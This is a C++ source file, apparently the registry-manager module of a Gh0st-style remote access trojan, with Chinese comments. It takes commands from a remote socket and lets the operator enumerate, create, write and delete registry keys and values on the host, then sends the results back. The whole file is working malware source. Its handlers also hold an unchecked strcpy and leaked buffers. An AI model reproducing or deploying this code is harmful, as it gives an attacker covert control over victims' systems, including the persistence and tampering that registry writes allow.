// RegeditManager.cpp: implementation of the CRegeditManager class.
//
//////////////////////////////////////////////////////////////////////

#include "RegeditManager.h"
#include "macros.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CRegeditManager::CRegeditManager(CClientSocket *pClient) : CManager(pClient)
{
	BYTE bToken = TOKEN_REGEDIT;
    Send(&bToken,1);
}

CRegeditManager::~CRegeditManager()
{

}

void CRegeditManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
	switch (lpBuffer[0])
	{
	case COMMAND_REG_ENUM:
	if (nSize>=3)
		EnumReg(lpBuffer[1],lpBuffer+2);
	else
		EnumReg(lpBuffer[1],NULL);
	break;
	case COMMAND_REG_CREATEKEY:
		CreateKey(lpBuffer+1);
		break;
	case COMMAND_REG_DELKEY:
		DeleteKey(lpBuffer+1);
		break;
	case COMMAND_REG_DELVAL:
		DeleteVal((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATKEY:
		CreateKeyEx((char*)lpBuffer+1);
		break;
	default:
		break;
	}
}
void CRegeditManager::DeleteVal(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
    if(msg.valsize>0)
	{   
		if(msg.size>0)
		{                //先处理项
	           char* path=new char[msg.size+1];
			   ZeroMemory(path,msg.size+1);
			   memcpy(path,tmp,msg.size);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.size;
		}
        
		char* key=new char[msg.valsize+1];
		ZeroMemory(key,msg.valsize+1);
		memcpy(key,tmp,msg.valsize);
		if(DeleteValue(key)){
			SendSucceed();
		}else
			SendError();
	}
}
void CRegeditManager::CreatSTR(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0)
		{                //先处理项
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(WriteValue(key,tmp))
		{
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}

BOOL CRegeditManager::WriteValue(LPCTSTR lpValueName, LPCTSTR lpValue)
{
	long lReturn=RegSetValueEx(m_hKey,lpValueName,0L,REG_SZ,(const BYTE *) lpValue,strlen(lpValue)+1);

   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}

BOOL CRegeditManager::WriteValue(LPCTSTR lpSubKey, DWORD dwVal)
{
	long lReturn=RegSetValueEx(m_hKey,lpSubKey,0L,REG_DWORD,(const BYTE *) &dwVal,sizeof(DWORD));
	
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
	
}
enum KEYVALUE
{
	MREG_SZ,
		MREG_DWORD,
		MREG_BINARY,
		MREG_EXPAND_SZ
};
//创建子键
void CRegeditManager::CreateKeyEx(char *buf)
{
	switch(buf[0])
	{
	   case MREG_SZ:        //字符
		   CreatSTR(buf+1);
		   break;
	   case MREG_DWORD:       //DWORD
           CreatDWORD(buf+1);
		   break;
	   case MREG_EXPAND_SZ:   //可扩展字符
		   CreatEXSTR(buf+1);
		   break;
	   default:
		   break;
	} 
}
enum MYKEY
{
    MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};

void CRegeditManager::CreatEXSTR(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0)
		{                //先处理项
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path)){
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(WriteBuf(key,tmp)){
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}
BOOL CRegeditManager::WriteBuf(LPCTSTR lpValueName, LPCTSTR lpValue) 
{
	long lReturn=RegSetValueEx(m_hKey,lpValueName,0L, REG_EXPAND_SZ,(const BYTE *) lpValue,strlen(lpValue)+1);
	
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}

DWORD atod(char* ch){
	int len=strlen(ch);
	DWORD d=0;
	for(int i=0;i<len;i++){
		int t=ch[i]-48;   //这位上的数字
		if(ch[i]>57||ch[i]<48){          //不是数字
			return d;
		}
		d*=10;
		d+=t;
	}
	return d;
}
void CRegeditManager::CreatDWORD(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //先处理项
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		DWORD d=atod(tmp);               //变为dword
		if(WriteValue(key,d)){
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}

void CRegeditManager::ParseKey(BYTE bType)
{
	switch(bType)
	{
	   case MHKEY_CLASSES_ROOT:
		   m_hKey=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
		   m_hKey=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   m_hKey=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   m_hKey=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   m_hKey=HKEY_CURRENT_CONFIG;
		   break;
	   default:
		   m_hKey=HKEY_LOCAL_MACHINE;
		   break;
	}
}

BOOL CRegeditManager::OpenKey(LPCTSTR lpSubKey)
{
	HKEY hKey;
	long lReturn=RegOpenKeyEx(m_hKey,lpSubKey,0L,KEY_ALL_ACCESS,&hKey);
	if(lReturn==ERROR_SUCCESS)
	{
        m_hKey=hKey;
		return TRUE;
	}
	return FALSE;
}

BOOL CRegeditManager::DeleteValue(LPCTSTR lpValueName)
{
	long lReturn=RegDeleteValue(m_hKey,lpValueName);
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}


BOOL CRegeditManager::MyDeleteKey(LPCTSTR lpSubKey)
{
    long lReturn=RegDeleteKey(m_hKey,lpSubKey);
	
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}

void CRegeditManager::DeleteKey(LPBYTE lpBuffer)
{
	ParseKey(lpBuffer[0]);

	if(MyDeleteKey((LPCTSTR)(lpBuffer+1)))
		SendSucceed();
	else
		SendError();
}

BOOL CRegeditManager::MyCreateKey(LPCTSTR lpSubKey)
{
	HKEY hKey;
	DWORD dw;
	long lReturn=RegCreateKeyEx(m_hKey,lpSubKey,0L,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dw);
	
	if(lReturn==ERROR_SUCCESS)
	{
		m_hKey=hKey;
		return TRUE;
	}
	
	return FALSE;
}

void  CRegeditManager:: CreateKey(LPBYTE lpBuffer)
{
	ParseKey(lpBuffer[0]);

	if(MyCreateKey((char*)(lpBuffer+1)))
	{
		SendSucceed();
	}else
	{
		SendError();
	}
}

LONG CRegeditManager::IsHaveSubkeys(DWORD & dwRet)
{
    DWORD    cSubKeys;             // number of subkeys
    // Get the class name and the value count.
    LONG lRes = RegQueryInfoKey(
        m_hKey_n,                 // key handle
        NULL,                   // buffer for class name
        NULL,                   // size of class string
        NULL,                   // reserved
        &cSubKeys,              // number of subkeys
        NULL,                   // longest subkey size
        NULL,                   // longest class string
        NULL,                   // number of values for this key
        NULL,                   // longest value name
        NULL,                   // longest value data
        NULL,                   // security descriptor
        NULL);                  // last write time
	dwRet = cSubKeys;
	return lRes;
}


#include "stdio.h"
LPBYTE CRegeditManager::GetRegInfo()
{
    LPBYTE buf=NULL;
	HKEY   hKey; 			//注册表返回句柄
    if(RegOpenKeyEx(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//打开
	{
       	DWORD dwIndex=0,NameCnt,NameMaxLen;
		DWORD KeySize,KeyCnt,KeyMaxLen,MaxDateLen;
        //这就是枚举了
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		// 数据大小 + 1
		KeySize=KeyMaxLen + 1 + sizeof(BOOL);
		if(KeyCnt>0&&KeySize>1)
		{
			int size=sizeof(REGMSG)+1;
			
			// 申请内存
			DWORD datasize=KeyCnt*KeySize+size+1;
			buf=(LPBYTE)LocalAlloc(LPTR, datasize);
			if(buf == NULL) return NULL;
			ZeroMemory(buf,datasize);
			
			
			buf[0]= TOKEN_REG_INFO;    //命令头
			REGMSG msg;                //数据头
			msg.size=KeySize;// 数据长度
			msg.count=KeyCnt;//　个数
			memcpy(buf+1,&msg,size);
			
			LONG    lRes = ERROR_SUCCESS;


			char *szBuffer = new  char[KeySize];
			for(dwIndex=0;dwIndex<KeyCnt;dwIndex++)		//枚举项
			{
				DWORD dwSubs = 0;
				ZeroMemory(szBuffer,KeySize);
				DWORD lpcbName = KeySize;
				RegEnumKeyEx(hKey,dwIndex,szBuffer,&lpcbName,NULL,NULL,NULL,NULL);

				HKEY hkResult = NULL;
				BOOL bRet = FALSE;
				LONG lRes = RegOpenKeyEx(hKey, szBuffer, 0, KEY_READ, &hkResult);
				if (lRes == ERROR_SUCCESS)
					m_hKey_n = hkResult;
				
				lRes = IsHaveSubkeys(dwSubs);
				if(ERROR_SUCCESS != lRes)
				{
					printf("打不开");
				}
				if(0 != dwSubs)
				{
					bRet =TRUE;
					printf("有");
				}else
				{
					printf("没有");
				}

				RegCloseKey(hkResult);

				memcpy(buf+dwIndex*KeySize+size ,&bRet,sizeof(BOOL));

				memcpy(buf+dwIndex*KeySize+size +sizeof(BOOL),szBuffer,lpcbName);
			}
			delete [] szBuffer;
			RegCloseKey(hKey);

			buf=(LPBYTE)LocalReAlloc(buf, datasize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
	}
    return buf;
}


//查询
void CRegeditManager::EnumReg(BYTE bToken,LPBYTE lpBuffer)
{
	ZeroMemory(KeyPath,MAX_PATH);
	switch(bToken)
	{
	   case MHKEY_CLASSES_ROOT:
		   MKEY=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
		   MKEY=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   MKEY=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   MKEY=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   MKEY=HKEY_CURRENT_CONFIG;
		   break;
	   default:
		   MKEY=HKEY_LOCAL_MACHINE;
		   break;
	}
	if(lpBuffer!=NULL)
       strcpy(KeyPath,(char*)lpBuffer);

	LPBYTE lpTemp = GetRegInfo();
	if (lpTemp == NULL)
	{
		SendError();
	}
	else
	{
		Send(lpTemp, LocalSize(lpTemp));
    	LocalFree(lpTemp);
	}

	lpTemp = NULL;

	lpTemp = GetRegKey();
    if(lpTemp!=NULL)
	{
		Send(lpTemp, LocalSize(lpTemp));
		LocalFree(lpTemp);
	}
	else
	{
		SendError();
	}
}


LPBYTE CRegeditManager::GetRegKey()
{
	char	*szValueName;		//键值名称
	LPBYTE	 szValueDate;		//键值数据
	LPBYTE   buf=NULL;
	HKEY	 hKey;			//注册表返回句柄
	
    if(RegOpenKeyEx(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//打开
	{
       	DWORD dwIndex=0,NameSize,NameCnt,NameMaxLen,Type;
		DWORD KeyCnt,KeyMaxLen,DataSize,MaxDateLen;
        //这就是枚举了
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		if(NameCnt>0&&MaxDateLen>0)
		{
			DataSize=MaxDateLen+1;
			NameSize=NameMaxLen+100;
			REGMSG  msg;
			msg.count=NameCnt;          //总个数
			msg.size=NameSize;          //名字大小
			msg.valsize=DataSize;       //数据大小
			int msgsize=sizeof(REGMSG);
			// 头                   标记            名字                数据
			DWORD size=sizeof(REGMSG)+ sizeof(BYTE)*NameCnt+ NameSize*NameCnt+DataSize*NameCnt+10;
			buf=(LPBYTE)LocalAlloc(LPTR, size);
			ZeroMemory(buf,size);
			buf[0]=TOKEN_REG_KEY;         //命令头
            memcpy(buf+1,(void*)&msg,msgsize);     //数据头
			
            szValueName=(char *)malloc(NameSize);
			szValueDate=(LPBYTE)malloc(DataSize);
			
			LPBYTE tmp=buf+msgsize+1;
			for(dwIndex=0;dwIndex<NameCnt;dwIndex++)	//枚举键值
			{
				ZeroMemory(szValueName,NameSize);
				ZeroMemory(szValueDate,DataSize);
				
				DataSize=MaxDateLen+1;
				NameSize=NameMaxLen+100;
				
				RegEnumValue(hKey,dwIndex,szValueName,&NameSize,NULL,&Type,szValueDate,&DataSize);//读取键值
				
				if(Type==REG_SZ)
				{
					tmp[0]=MREG_SZ;  
				}
				if(Type==REG_DWORD)
				{
					tmp[0]=MREG_DWORD;  
				}
				if(Type==REG_BINARY)
				{
					tmp[0]=MREG_BINARY;
				}
				if(Type==REG_EXPAND_SZ)
				{
					tmp[0]=MREG_EXPAND_SZ;
				}
				tmp+=sizeof(BYTE);
				memcpy(tmp,szValueName,msg.size);
				tmp+=msg.size;
				memcpy(tmp,szValueDate,msg.valsize);
				tmp+=msg.valsize;
			}
			free(szValueName);
			free(szValueDate);
			buf=(LPBYTE)LocalReAlloc(buf, size, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}   
	}
	return buf;
}

//没有执行成功
void CRegeditManager::SendError()
{
	BYTE bToken=TOKEN_REG_ERROR;
	Send(&bToken, sizeof(BYTE));
}

void CRegeditManager::SendSucceed()
{
	BYTE bToken=TOKEN_REG_SUCCEED;
	Send(&bToken, sizeof(BYTE));
}
